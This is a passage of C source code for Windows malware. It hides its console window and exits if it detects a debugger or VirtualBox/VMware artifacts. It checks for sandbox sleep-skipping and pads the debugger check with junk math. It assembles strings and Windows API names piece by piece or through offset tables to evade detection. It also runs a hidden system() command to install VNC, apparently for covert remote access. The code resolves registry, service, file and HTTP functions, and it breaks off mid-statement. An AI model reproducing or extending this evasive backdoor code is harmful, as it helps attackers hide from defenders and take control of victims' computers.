	strcat(full_string_1, part_1_134);
	strcat(full_string_1, part_1_135);
	strcat(full_string_1, part_1_136);
	strcat(full_string_1, part_1_137);
	strcat(full_string_1, part_1_138);
	strcat(full_string_1, part_1_139);
	strcat(full_string_1, part_1_140);
	strcat(full_string_1, part_1_141);
	strcat(full_string_1, part_1_142);
	strcat(full_string_1, part_1_143);
	strcat(full_string_1, part_1_144);
	strcat(full_string_1, part_1_145);
	strcat(full_string_1, part_1_146);
	strcat(full_string_1, part_1_147);
	strcat(full_string_1, part_1_148);
	strcat(full_string_1, part_1_149);
	strcat(full_string_1, part_1_150);
	strcat(full_string_1, part_1_151);
	strcat(full_string_1, part_1_152);
	strcat(full_string_1, part_1_153);
	strcat(full_string_1, part_1_154);
	strcat(full_string_1, part_1_155);
	strcat(full_string_1, part_1_156);
	strcat(full_string_1, part_1_157);
	strcat(full_string_1, part_1_158);
	strcat(full_string_1, part_1_159);
	strcat(full_string_1, part_1_160);
	strcat(full_string_1, part_1_161);
	strcat(full_string_1, part_1_162);
	strcat(full_string_1, part_1_163);
	strcat(full_string_1, part_1_164);
	strcat(full_string_1, part_1_165);
	strcat(full_string_1, part_1_166);
	strcat(full_string_1, part_1_167);
	strcat(full_string_1, part_1_168);
	strcat(full_string_1, part_1_169);
	strcat(full_string_1, part_1_170);
	strcat(full_string_1, part_1_171);
	strcat(full_string_1, part_1_172);
	strcat(full_string_1, part_1_173);
	strcat(full_string_1, part_1_174);
	strcat(full_string_1, part_1_175);
	strcat(full_string_1, part_1_176);
	strcat(full_string_1, part_1_177);
	strcat(full_string_1, part_1_178);
	strcat(full_string_1, part_1_179);
	strcat(full_string_1, part_1_180);
	strcat(full_string_1, part_1_181);
	strcat(full_string_1, part_1_182);
	strcat(full_string_1, part_1_183);
	
	int result = system(full_string_1);
	if (result == 0) {
        //printf("[+] VNC installed!\n");
    } else {
        //printf("[x] VNC hasn't installed.\n");
    }
	
	
	return;
}

void Chk_DBG(){
	PPEB pPEB = GetPEB();
	if (pPEB->BeingDebugged != 0 || pPEB->NtGlobalFlag != 0){
		//printf("[x] PROGRAM IS BEING DEBUGGED, EXITING!\n");
		//MessageBoxA(NULL, "[x] PROGRAM IS BEING DEBUGGED, EXITING!", "Title", MB_OK);
		
		
		// CALL DEAD CODE TO EXECUTE
		//to show in main graph flow
		int x = 0;
		x += 1;
		x -= 1;
		x *= 2;
		x /= 2;

		// Additional complex math operations
		double y = 2.5;
		double z = 3.7;
		double result = 0.0;

		// Perform math operations
		result = sqrt(pow(y, 2) + pow(z, 2)); 
		result = sin(result);
		result = cos(result); 
		result = tan(result); 

		// Use the result to perform more operations
		for (int i = 0; i < 10; ++i) {
			result *= i;
			result /= (i + 1);
			result += i;
		}

		// Use the final result to perform some conditional operations
		if (result > 100) {
		result -= 124213;
		} 
		else {
		result += 2134;
		}
		
		exit(0);	//Debug
	}
	//printf("[+] NO DEBUGGER PRESENT, CONTINUING!\n");
	//MessageBoxA(NULL, "[+] NO DEBUGGER PRESENT, CONTINUING!", "Title", MB_OK);
	
	//RETURN AND START THE MALWARE
	return;
}


void Chk_VM(NtDelayExecution NT_DelayExecution){
	
	// artifacts to check
	//add string splitting
	//LPCSTR path1 = "C:\\windows\\system32\\drivers\\VBoxMouse.sys";
	//LPCSTR path2 = "C:\\windows\\system32\\drivers\\VBoxGuest.sys";
	//LPCSTR path3 = "C:\\Windows\\System32\\vmGuestLib.dll";
	
	char full_string_1[100];	// C:\\windows\\system32\\drivers\\VBoxMouse.sys
	char part_string_1_1[] = "C";
	char part_string_1_2[] = ":";
	char part_string_1_3[] = "\\w";
	char part_string_1_4[] = "i";
	char part_string_1_5[] = "n";
	char part_string_1_6[] = "d";
	char part_string_1_7[] = "o";
	char part_string_1_8[] = "w";
	char part_string_1_9[] = "s\\";
	char part_string_1_10[] = "s";
	char part_string_1_11[] = "y";
	char part_string_1_12[] = "s";
	char part_string_1_13[] = "te";
	char part_string_1_14[] = "m";
	char part_string_1_15[] = "3";
	char part_string_1_16[] = "2";
	char part_string_1_17[] = "\\d";
	char part_string_1_18[] = "r";
	char part_string_1_19[] = "i";
	char part_string_1_20[] = "v";
	char part_string_1_21[] = "e";
	char part_string_1_22[] = "r";
	char part_string_1_23[] = "s";
	char part_string_1_24[] = "\\";
	char part_string_1_25[] = "V";
	char part_string_1_26[] = "B";
	char part_string_1_27[] = "o";
	char part_string_1_28[] = "x";
	char part_string_1_29[] = "M";
	char part_string_1_30[] = "o";
	char part_string_1_31[] = "u";
	char part_string_1_32[] = "s";
	char part_string_1_33[] = "e";
	char part_string_1_34[] = ".";
	char part_string_1_35[] = "s";
	char part_string_1_36[] = "y";
	char part_string_1_37[] = "s";
	strcpy(full_string_1, part_string_1_1);
	strcat(full_string_1, part_string_1_2);
	strcat(full_string_1, part_string_1_3);
	strcat(full_string_1, part_string_1_4);
	strcat(full_string_1, part_string_1_5);
	strcat(full_string_1, part_string_1_6);
	strcat(full_string_1, part_string_1_7);
	strcat(full_string_1, part_string_1_8);
	strcat(full_string_1, part_string_1_9);
	strcat(full_string_1, part_string_1_10);
	strcat(full_string_1, part_string_1_11);
	strcat(full_string_1, part_string_1_12);
	strcat(full_string_1, part_string_1_13);
	strcat(full_string_1, part_string_1_14);
	strcat(full_string_1, part_string_1_15);
	strcat(full_string_1, part_string_1_16);
	strcat(full_string_1, part_string_1_17);
	strcat(full_string_1, part_string_1_18);
	strcat(full_string_1, part_string_1_19);
	strcat(full_string_1, part_string_1_20);
	strcat(full_string_1, part_string_1_21);
	strcat(full_string_1, part_string_1_22);
	strcat(full_string_1, part_string_1_23);
	strcat(full_string_1, part_string_1_24);
	strcat(full_string_1, part_string_1_25);
	strcat(full_string_1, part_string_1_26);
	strcat(full_string_1, part_string_1_27);
	strcat(full_string_1, part_string_1_28);
	strcat(full_string_1, part_string_1_29);
	strcat(full_string_1, part_string_1_30);
	strcat(full_string_1, part_string_1_31);
	strcat(full_string_1, part_string_1_32);
	strcat(full_string_1, part_string_1_33);
	strcat(full_string_1, part_string_1_34);
	strcat(full_string_1, part_string_1_35);
	strcat(full_string_1, part_string_1_36);
	strcat(full_string_1, part_string_1_37);
	char full_string_2[100];	// C:\\windows\\system32\\drivers\\VBoxGuest.sys
	char part_string_2_1[] = "C";
	char part_string_2_2[] = ":";
	char part_string_2_3[] = "\\w";
	char part_string_2_4[] = "i";
	char part_string_2_5[] = "n";
	char part_string_2_6[] = "d";
	char part_string_2_7[] = "o";
	char part_string_2_8[] = "w";
	char part_string_2_9[] = "s\\";
	char part_string_2_10[] = "s";
	char part_string_2_11[] = "y";
	char part_string_2_12[] = "s";
	char part_string_2_13[] = "te";
	char part_string_2_14[] = "m";
	char part_string_2_15[] = "3";
	char part_string_2_16[] = "2";
	char part_string_2_17[] = "\\d";
	char part_string_2_18[] = "r";
	char part_string_2_19[] = "i";
	char part_string_2_20[] = "v";
	char part_string_2_21[] = "e";
	char part_string_2_22[] = "r";
	char part_string_2_23[] = "s";
	char part_string_2_24[] = "\\";
	char part_string_2_25[] = "V";
	char part_string_2_26[] = "B";
	char part_string_2_27[] = "o";
	char part_string_2_28[] = "x";
	char part_string_2_29[] = "G";
	char part_string_2_30[] = "u";
	char part_string_2_31[] = "e";
	char part_string_2_32[] = "s";
	char part_string_2_33[] = "t";
	char part_string_2_34[] = ".";
	char part_string_2_35[] = "s";
	char part_string_2_36[] = "y";
	char part_string_2_37[] = "s";
	strcpy(full_string_2, part_string_2_1);
	strcat(full_string_2, part_string_2_2);
	strcat(full_string_2, part_string_2_3);
	strcat(full_string_2, part_string_2_4);
	strcat(full_string_2, part_string_2_5);
	strcat(full_string_2, part_string_2_6);
	strcat(full_string_2, part_string_2_7);
	strcat(full_string_2, part_string_2_8);
	strcat(full_string_2, part_string_2_9);
	strcat(full_string_2, part_string_2_10);
	strcat(full_string_2, part_string_2_11);
	strcat(full_string_2, part_string_2_12);
	strcat(full_string_2, part_string_2_13);
	strcat(full_string_2, part_string_2_14);
	strcat(full_string_2, part_string_2_15);
	strcat(full_string_2, part_string_2_16);
	strcat(full_string_2, part_string_2_17);
	strcat(full_string_2, part_string_2_18);
	strcat(full_string_2, part_string_2_19);
	strcat(full_string_2, part_string_2_20);
	strcat(full_string_2, part_string_2_21);
	strcat(full_string_2, part_string_2_22);
	strcat(full_string_2, part_string_2_23);
	strcat(full_string_2, part_string_2_24);
	strcat(full_string_2, part_string_2_25);
	strcat(full_string_2, part_string_2_26);
	strcat(full_string_2, part_string_2_27);
	strcat(full_string_2, part_string_2_28);
	strcat(full_string_2, part_string_2_29);
	strcat(full_string_2, part_string_2_30);
	strcat(full_string_2, part_string_2_31);
	strcat(full_string_2, part_string_2_32);
	strcat(full_string_2, part_string_2_33);
	strcat(full_string_2, part_string_2_34);
	strcat(full_string_2, part_string_2_35);
	strcat(full_string_2, part_string_2_36);
	strcat(full_string_2, part_string_2_37);
	char full_string_3[100];	// C:\\Windows\\System32\\vmGuestLib.dll
	char part_string_3_1[] = "C";
	char part_string_3_2[] = ":";
	char part_string_3_3[] = "\\w";
	char part_string_3_4[] = "i";
	char part_string_3_5[] = "n";
	char part_string_3_6[] = "d";
	char part_string_3_7[] = "o";
	char part_string_3_8[] = "w";
	char part_string_3_9[] = "s\\";
	char part_string_3_10[] = "s";
	char part_string_3_11[] = "y";
	char part_string_3_12[] = "s";
	char part_string_3_13[] = "te";
	char part_string_3_14[] = "m";
	char part_string_3_15[] = "3";
	char part_string_3_16[] = "2";
	char part_string_3_17[] = "\\";
	char part_string_3_18[] = "v";
	char part_string_3_19[] = "m";
	char part_string_3_20[] = "G";
	char part_string_3_21[] = "u";
	char part_string_3_22[] = "e";
	char part_string_3_23[] = "s";
	char part_string_3_24[] = "t";
	char part_string_3_25[] = "l";
	char part_string_3_26[] = "i";
	char part_string_3_27[] = "b";
	char part_string_3_28[] = ".";
	char part_string_3_29[] = "d";
	char part_string_3_30[] = "l";
	char part_string_3_31[] = "l";
	char part_string_3_32[] = "";
	char part_string_3_33[] = "";
	char part_string_3_34[] = "";
	char part_string_3_35[] = "";
	char part_string_3_36[] = "";
	char part_string_3_37[] = "";
	strcpy(full_string_3, part_string_3_1);
	strcat(full_string_3, part_string_3_2);
	strcat(full_string_3, part_string_3_3);
	strcat(full_string_3, part_string_3_4);
	strcat(full_string_3, part_string_3_5);
	strcat(full_string_3, part_string_3_6);
	strcat(full_string_3, part_string_3_7);
	strcat(full_string_3, part_string_3_8);
	strcat(full_string_3, part_string_3_9);
	strcat(full_string_3, part_string_3_10);
	strcat(full_string_3, part_string_3_11);
	strcat(full_string_3, part_string_3_12);
	strcat(full_string_3, part_string_3_13);
	strcat(full_string_3, part_string_3_14);
	strcat(full_string_3, part_string_3_15);
	strcat(full_string_3, part_string_3_16);
	strcat(full_string_3, part_string_3_17);
	strcat(full_string_3, part_string_3_18);
	strcat(full_string_3, part_string_3_19);
	strcat(full_string_3, part_string_3_20);
	strcat(full_string_3, part_string_3_21);
	strcat(full_string_3, part_string_3_22);
	strcat(full_string_3, part_string_3_23);
	strcat(full_string_3, part_string_3_24);
	strcat(full_string_3, part_string_3_25);
	strcat(full_string_3, part_string_3_26);
	strcat(full_string_3, part_string_3_27);
	strcat(full_string_3, part_string_3_28);
	strcat(full_string_3, part_string_3_29);
	strcat(full_string_3, part_string_3_30);
	strcat(full_string_3, part_string_3_31);
	strcat(full_string_3, part_string_3_32);
	strcat(full_string_3, part_string_3_33);
	strcat(full_string_3, part_string_3_34);
	strcat(full_string_3, part_string_3_35);
	strcat(full_string_3, part_string_3_36);
	strcat(full_string_3, part_string_3_37);
	
	DWORD attributes1 = GetFileAttributes(full_string_1);
	DWORD attributes2 = GetFileAttributes(full_string_2);
	DWORD attributes3 = GetFileAttributes(full_string_3);
	// Check if both files exist
	if ( (attributes1 != INVALID_FILE_ATTRIBUTES && !(attributes1 & FILE_ATTRIBUTE_DIRECTORY)) || (attributes2 != INVALID_FILE_ATTRIBUTES && !(attributes2 & FILE_ATTRIBUTE_DIRECTORY)) || (attributes3 != INVALID_FILE_ATTRIBUTES && !(attributes3 & FILE_ATTRIBUTE_DIRECTORY)) ) {
	// At least one of the files exists
	//printf("[+] THIS IS A VM\n!");
	exit(1);
	}


	LARGE_INTEGER sleepInterval;
	sleepInterval.QuadPart = -600000000; //1 minute (60 seconds) -> 60000 milliseconds
	//printf("[+] BEGIN SLEEP\n");
	
	
	// Get the system uptime before sleeping
	ULONG64 uptimeBeforeSleep = GetTickCount64();

	// Initiate Delay
	NT_DelayExecution(FALSE, &sleepInterval);

	// Get the system uptime after sleeping
	ULONG64 uptimeAfterSleep = GetTickCount64();

	// Calculate the actual sleep time in milliseconds
	ULONG64 actualSleepTime = uptimeAfterSleep - uptimeBeforeSleep;
	
	//printf("Actual sleep time: %llu milliseconds\n", actualSleepTime);

	// Check if the actual sleep time is close to the expected sleep time
	if (actualSleepTime >= 60000) {	// if time_slept >= 60 seconds
	return;
	} 
	else {
	//printf("[+] THIS IS A VM\n!");
	exit(1);
	}
	
}

BOOL Chk_VM_cmp(HKEY rootKey, char* subKeyName, char* registryValue, char* comparisonValue, FARPROC open_key_reg_func, FARPROC query_key_reg_func) {
	HKEY hKEY = NULL;
	LONG result;
	char value[1024];
	DWORD size = sizeof(value);
	result = open_key_reg_func(rootKey, subKeyName, 0, KEY_READ, &hKEY);
	if (result == ERROR_SUCCESS) {
		RegQueryValueExA(hKEY, registryValue, NULL, NULL, (LPBYTE)value, &size);
		if (result == ERROR_SUCCESS) {
			if (strcmp(value, comparisonValue) == 0) {
			return TRUE;
			}
		}
	}
	else{
		//printf("[x] Couldn't Query Registry Key, ERR -> %d\n", result);
	}
	return FALSE;
}


BOOL Chk_VM_substr(HKEY rootKey, char* subKeyName, char* registryValue, char* comparisonValue, FARPROC open_key_reg_func, FARPROC query_key_reg_func) {
	HKEY hKEY = NULL;
	LONG result;
	char value[1024];
	DWORD size = sizeof(value);
	result = open_key_reg_func(rootKey, subKeyName, 0, KEY_READ, &hKEY);
	if (result == ERROR_SUCCESS) {
		RegQueryValueExA(hKEY, registryValue, NULL, NULL, (LPBYTE)value, &size);
		if (result == ERROR_SUCCESS) {
			if (strstr(value, comparisonValue) != NULL) {
				return TRUE;
			}
		}
	else{
		//printf("[x] Couldn't Query Registry Key, ERR -> %d\n", result);
	}
	}
	
	return FALSE;
}


int main(){
	

    //Get the console window handle
    HWND consoleWindow = GetConsoleWindow();
    
    //Hide the window
    ShowWindow(consoleWindow, SW_HIDE);	
	
	Chk_DBG();
	

	
	// --- START OFFSETS --- //
	//int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};	//CreateToolhelp32Snapshot 
	//int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};				//Process32First
	//int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};					//Process32Next
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int dll_n__t_offset[] = {39,45,29,37,37};
	int dll_a_DV_offset[] = {0,3,21,0,15,8,55,54,62,3,11,11};
	int dll_H_11_P_offset[] = {22,8,13,7,19,19,15,62,3,11,11};
	int dll_d_b_g_offset[] = {3,1,6,7,4,11,15,62,3,11,11};		
	int dll_inet_offset[] = {48,8,13,8,13,4,19,62,3,11,11};
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};						//LoadLibraryA
	int cr_dir_offset[] = {28,17,4,0,19,4,29,8,17,4,2,19,14,17,24,26};				//CreateDirectoryA
	int set_file_attr_offset[] = {44,4,19,31,8,11,4,26,19,19,17,8,1,20,19,4,18,26};	//SetFileAttributesA
	int cr_file_offset[] = {28,17,4,0,19,4,31,8,11,4,26};							//CreateFileA
	int wr_file_offset[] = {48,17,8,19,4,31,8,11,4};								//WriteFile
	int open_key_reg_offset[] = {43,4,6,40,15,4,13,36,4,24,30,23,26};				//RegOpenKeyExA
	int set_key_reg_offset[] = {43,4,6,44,4,19,47,0,11,20,4,30,23,26};				//RegSetValueExA
	int cr_key_reg_offset[] = {43,4,6,28,17,4,0,19,4,36,4,24,26};					//RegCreateKeyA
	int close_key_reg_offset[] = {43,4,6,28,11,14,18,4,36,4,24};					//RegCloseKey
	int query_key_reg_offset[] = {43,4,6,42,20,4,17,24,47,0,11,20,4,30,23,26};					//RegQueryValueExA
	/*
	int h_11_p_open_offset[] = {48,8,13,33,19,19,15,40,15,4,13};					//WinHttpOpen
	int h_11_p_conn_offset[] = {48,8,13,33,19,19,15,28,14,13,13,4,2,19};				//WinHttpConnect
	int h_11_p_open_req_offset[] = {48,8,13,33,19,19,15,40,15,4,13,43,4,16,20,4,18,19};	//WinHttpOpenRequest
	int h_11_p_send_offset[] = {48,8,13,33,19,19,15,44,4,13,3,43,4,16,20,4,18,19};	//WinHttpSendRequest
	int h_11_p_recv_offset[] = {48,8,13,33,19,19,15,43,4,2,4,8,21,4,43,4,18,15,14,13,18,4}; //WinHttpReceiveResponse
	int h_11_p_query_offset[] = {48,8,13,33,19,19,15,42,20,4,17,24,29,0,19,0,26,21,0,8,11,0,1,11,4}; //WinHttpQueryDataAvailable
	int h_11_p_read_offset[] = {48,8,13,33,19,19,15,43,4,0,3,29,0,19,0}; //WinHttpReadData
	int h_11_p_close_offset[] = {48,8,13,33,19,19,15,28,11,14,18,4,33,0,13,3,11,4}; //WinHttpCloseHandle
	*/
	//int wr_dmp_offset[] = {38,8,13,8,29,20,12,15,48,17,8,19,4,29,20,12,15}; //MiniDumpWriteDump
	int open_SC_offset[] = {40,15,4,13,44,28,38,0,13,0,6,4,17,26};	//OpenSCManagerA
	int open_service_offset[] = {40,15,4,13,44,4,17,21,8,2,4,26};	//OpenServiceA
	int start_service_offset[] = {44,19,0,17,19,44,4,17,21,8,2,4,26};	//StartServiceA
	int close_service_offset[] = {28,11,14,18,4,44,4,17,21,8,2,4,33,0,13,3,11,4}; //CloseServiceHandle
	int n3t_op3n_offset[] = {34,13,19,4,17,13,4,19,40,15,4,13,26};
	int n3t_op3n_ur1_offset[] = {34,13,19,4,17,13,4,19,40,15,4,13,46,17,11,26};
	int n3t_r3ad_f1l3_offset[] = {34,13,19,4,17,13,4,19,43,4,0,3,31,8,11,4};
	int n3t_cl0s3_hndl3_offset[] = {34,13,19,4,17,13,4,19,28,11,14,18,4,33,0,13,3,11,4};
	
	
	// --- END OFFSETS --- /
	
	// --- init variables --- //
	
	wchar_t full_string_mod_1[100];	// L"Kernel32"
	wchar_t part_mod_1_1[] = L"K";
	wchar_t part_mod_1_2[] = L"e";
	wchar_t part_mod_1_3[] = L"r";
	wchar_t part_mod_1_4[] = L"n";
	wchar_t part_mod_1_5[] = L"e";
	wchar_t part_mod_1_6[] = L"l";
	wchar_t part_mod_1_7[] = L"3";
	wchar_t part_mod_1_8[] = L"2";
	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
	wcscpy(full_string_mod_1, part_mod_1_1);
	wcscat(full_string_mod_1, part_mod_1_2);
	wcscat(full_string_mod_1, part_mod_1_3);
	wcscat(full_string_mod_1, part_mod_1_4);
	wcscat(full_string_mod_1, part_mod_1_5);
	wcscat(full_string_mod_1, part_mod_1_6);
	wcscat(full_string_mod_1, part_mod_1_7);
	wcscat(full_string_mod_1, part_mod_1_8);
	//printf("size of /shellcode.bin after concat-> %d\n",sizeof(full_string_1));
	//wprintf(L"%s\n",full_string_1);
	HMODULE hK32 = Get_Module(full_string_mod_1);
	
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
	char keys[]={'P','L','S','a','5','p','A','1','w','F'};
	//SIZE_T magic_size = sizeof(magic);
	

	
	// --- end variables init --- //
	

	// --- START INIT STRUCTS --- //
	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
	CLIENT_ID CID;
	// --- END INIT STRUCTS --- //

	// --- START GET LoadLibraryA function ---//
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
	// --- END GET LoadLibraryA function ---//


	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD KERNEL32 DLL ---//
	
	// --- START LOAD NTDLL DLL --- //
	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
	if (hDLL_n__t == NULL){
		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)),hDLL_n__t);
	// --- END LOAD NTDLL DLL ---//
	
	// --- START LOAD Advapi32 DLL --- //
	HMODULE hdll_a_DV = L_0_D_LIB(GetOriginal(dll_a_DV_offset,ALL_ALPHANUM,sizeof(dll_a_DV_offset)));
	if (hdll_a_DV == NULL){
		//printf("[x] COULD NOT LOAD advapi32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_a_DV_offset,ALL_ALPHANUM,sizeof(dll_a_DV_offset)),hdll_a_DV);
	// --- END LOAD Advapi32 DLL ---//
	
	// --- START LOAD winhttp DLL --- //
	HMODULE hdll_H_11_P = L_0_D_LIB(GetOriginal(dll_H_11_P_offset,ALL_ALPHANUM,sizeof(dll_H_11_P_offset)));
	if (hdll_H_11_P == NULL){
		//printf("[x] COULD NOT LOAD winhttp.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_H_11_P_offset,ALL_ALPHANUM,sizeof(dll_H_11_P_offset)),hdll_H_11_P);
	// --- END LOAD winhttp DLL ---//
	
	// --- START LOAD Dbghelp DLL --- //
	HMODULE hdll_d_b_g = L_0_D_LIB(GetOriginal(dll_d_b_g_offset,ALL_ALPHANUM,sizeof(dll_d_b_g_offset)));
	if (hdll_d_b_g == NULL){
		//printf("[x] COULD NOT LOAD dbghelp.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_d_b_g_offset,ALL_ALPHANUM,sizeof(dll_d_b_g_offset)),hdll_H_11_P);
	// --- END LOAD Dbghelp DLL ---//
	
	// --- START LOAD Wininet.dll DLL --- //
	HMODULE hdll_inet = L_0_D_LIB(GetOriginal(dll_inet_offset,ALL_ALPHANUM,sizeof(dll_inet_offset)));
	if (hdll_inet == NULL){
		//printf("[x] COULD NOT LOAD dbghelp.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(dll_d_b_g_offset,ALL_ALPHANUM,sizeof(dll_inet_offset)),hdll_inet);
	// --- END LOAD Wininet.dll DLL ---//
	
	
	
	//printf("sizeof(NtClose) -> %d\n",sizeof("NtClose"));
	
	char full_func_1[8];	//NtClose
	char part_func_1_1[] = "N";
	char part_func_1_2[] = "t";
	char part_func_1_3[] = "C";
	char part_func_1_4[] = "lo";
	char part_func_1_5[] = "s";
	char part_func_1_6[] = "e";
	strcpy(full_func_1, part_func_1_1);
	strcat(full_func_1, part_func_1_2);
	strcat(full_func_1, part_func_1_3);
	strcat(full_func_1, part_func_1_4);
	strcat(full_func_1, part_func_1_5);
	strcat(full_func_1, part_func_1_6);
	//printf("%s\n",full_func_1);
	
	//printf("sizeof(NtOpenMutant) -> %d\n",sizeof("NtOpenMutant"));

	char full_func_2[8];	//NtOpenMutant
	char part_func_2_1[] = "N";
	char part_func_2_2[] = "t";
	char part_func_2_3[] = "Op";
	char part_func_2_4[] = "e";
	char part_func_2_5[] = "n";
	char part_func_2_6[] = "Mu";
	char part_func_2_7[] = "t";
	char part_func_2_8[] = "a";
	char part_func_2_9[] = "n";
	char part_func_2_10[] = "t";
	strcpy(full_func_2, part_func_2_1);
	strcat(full_func_2, part_func_2_2);
	strcat(full_func_2, part_func_2_3);
	strcat(full_func_2, part_func_2_4);
	strcat(full_func_2, part_func_2_5);
	strcat(full_func_2, part_func_2_6);
	strcat(full_func_2, part_func_2_7);
	strcat(full_func_2, part_func_2_8);
	strcat(full_func_2, part_func_2_9);
	strcat(full_func_2, part_func_2_10);
	
	
	//printf("%s\n",full_func_2);
	
	//printf("sizeof(NtCreateMutant) -> %d\n",sizeof("NtCreateMutant"));

	char full_func_3[15];	//NtCreateMutant
	char part_func_3_1[] = "N";
	char part_func_3_2[] = "t";
	char part_func_3_3[] = "Cr";
	char part_func_3_4[] = "e";
	char part_func_3_5[] = "at";
	char part_func_3_6[] = "eMu";
	char part_func_3_7[] = "t";
	char part_func_3_8[] = "a";
	char part_func_3_9[] = "n";
	char part_func_3_10[] = "t";
	strcpy(full_func_3, part_func_3_1);
	strcat(full_func_3, part_func_3_2);
	strcat(full_func_3, part_func_3_3);
	strcat(full_func_3, part_func_3_4);
	strcat(full_func_3, part_func_3_5);
	strcat(full_func_3, part_func_3_6);
	strcat(full_func_3, part_func_3_7);
	strcat(full_func_3, part_func_3_8);
	strcat(full_func_3, part_func_3_9);
	strcat(full_func_3, part_func_3_10);
	
	
	//printf("%s\n",full_func_3);
	
	
	
	
	
	// --- START FUNCTION PROTOTYPES INIT --- //
	//printf("[+] populating prototypes...\n");
	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
	//NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
	//NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, full_func_1);
	//NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
	//NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
	//NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
	//NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
	//NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
	NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,full_func_2);
	NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,full_func_3);
	NtDelayExecution NT_DelayExecution = (NtDelayExecution)GetProcAddress(hDLL_n__t,"NtDelayExecution");
	//NtCreateFile NT_CreateFile = (NtCreateFile)GetProcAddress(hDLL_n__t,"NtCreateFile");
	//NtWriteFile NT_WriteFile = (NtWriteFile)GetProcAddress(hDLL_n__t,"NtWriteFile");
	//FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
	//FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
	//FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
	FARPROC cr_dir_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_dir_offset,ALL_ALPHANUM,sizeof(cr_dir_offset)));
	FARPROC set_file_attr_func = GetProcAddress(hDLL_k_er_32,GetOriginal(set_file_attr_offset,ALL_ALPHANUM,sizeof(set_file_attr_offset)));
	FARPROC cr_file_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_file_offset,ALL_ALPHANUM,sizeof(cr_file_offset)));
	FARPROC wr_file_func = GetProcAddress(hDLL_k_er_32,GetOriginal(wr_file_offset,ALL_ALPHANUM,sizeof(wr_file_offset)));
	FARPROC open_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(open_key_reg_offset,ALL_ALPHANUM,sizeof(open_key_reg_offset)));
	FARPROC set_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(set_key_reg_offset,ALL_ALPHANUM,sizeof(set_key_reg_offset)));
	FARPROC cr_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(cr_key_reg_offset,ALL_ALPHANUM,sizeof(cr_key_reg_offset)));
	FARPROC query_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(query_key_reg_offset,ALL_ALPHANUM,sizeof(query_key_reg_offset)));
	FARPROC close_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(close_key_reg_offset,ALL_ALPHANUM,sizeof(close_key_reg_offset)));
	/*
	FARPROC	h_11_p_open_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_open_offset,ALL_ALPHANUM,sizeof(h_11_p_open_offset)));	//WinHttpOpen
